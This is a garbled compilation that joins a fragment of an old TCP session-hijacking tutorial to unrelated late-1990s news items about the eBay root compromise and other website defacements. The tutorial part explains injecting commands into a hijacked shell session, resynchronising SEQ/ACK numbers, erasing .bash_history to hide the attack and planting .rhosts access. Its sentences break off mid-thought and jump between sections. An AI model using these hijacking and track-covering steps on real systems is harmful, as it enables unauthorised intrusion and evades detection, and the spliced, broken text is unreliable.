          We calculate SEQ/ACK out of packet 1, NOT out of the 'echo' from B, 
          because we have to be as fast as possible, and packet 2 could be slow.
          We send some backspaces and some enters. To clean up the command line.
          We will probably still get some error message back from the shell.
          But we handle that too! (see sourcecode)

          NOTE: here it is important to be in a shell. But if you have been 
                watching someone, and you notice he's always directly going to 
                'pine' and you can't get inbetween on time.
                NO PROBS.... just make a cleanup string that cleans up 
                'pine' and puts you back in the shell. (some control chars, 
                hotkeys, whatever....)
          NOTE: if you clean up the .sh_history of .bash_history (whatever) this 
                attack is one of the nicest there is. Another advantage above 
                sniffing.
          NOTE: Noone says you have to make a .rhosts file (rlogin and 
                family might be disabled), you can change permissions, put

          expect a packet with an ACK set (PSH or not). It should come within 5  
          packets, we use this limit, because we should be able to handle some 
          previous ACK packets!
          NOTE we don't check SEQ nrs, because we have no clue of what they are 
               going to be (data might have been send our way, or not).

          To get back on track, we try to receive 2 ACK packets without data 
          with the same SEQ/ACK. We know enough packets will be send as a 
          response to incorrect packets from the confused host A.
          This is how we get back on track. 
          NOTE In a case where A completely gave up, simple spoof a packet with 
               incorrect SEQ/ACK to get the correct numbers back.

       Going once, going twice... HACKED!
       
       
       By Adam L. Penenberg
       
       
       eBay, the hot one-to-one auction site, was hacked on Saturday by a 22-year
       old college student who goes by the handle MagicFX. But the story doesn't
       end there. The hacker maintains access to the site and can return at will.
       He has 'root' access to eBay's computers, the same kind the legitimate
       administrators enjoy. This means he could change prices or place fake ads,
       divert traffic to other sites or even take down the entire network.
       
       
       This was starkly illustrated to this reporter on Wednesday night, when the
       hacker, to prove his point, took down eBay's home page for two minutes and
       replaced it with the message:
       
       
       "by MagicFX
       
       
       "That you can't always trust people - not even huge companies. (who woulda
       known that?)
       
       
       "It's 9:30 PM do you know who has your credit card information?"

       The largest security meeting in the South America was hacked by brazilian
       group called "Brazilian r00ts". 
       
       
       They took control the event's web site, which was located at
       http://www.mantel.com.br/eventos/security. The Security Forum'99 is the
       most important event on information security in the South America and its
       main purpose was discuss vulnerabilities and ways to defeat break-ins. 
       
       
       One of the most important guests was Christopher Klaus from ISS, as well
       as people from Axent. 
       
       
       The company responsible for the organization of the event, Mantel, was
       also hacked (www.mantel.com.br).

       I was really trying to ignore this whole mess. First a
       
        Belgium garment manufacturer makes extremely
       disparaging remarks about hackers on its web site. Then
       it looks like someone may have defaced their web page,
       then Leander Kahney of Wired Online writes a story
       about it all that totally screws up the words hacker and
       cracker. I am kind of surprised that the defaced page
       has still not been fixed 12 hours later. This whole mess
       just reeks of marketing.
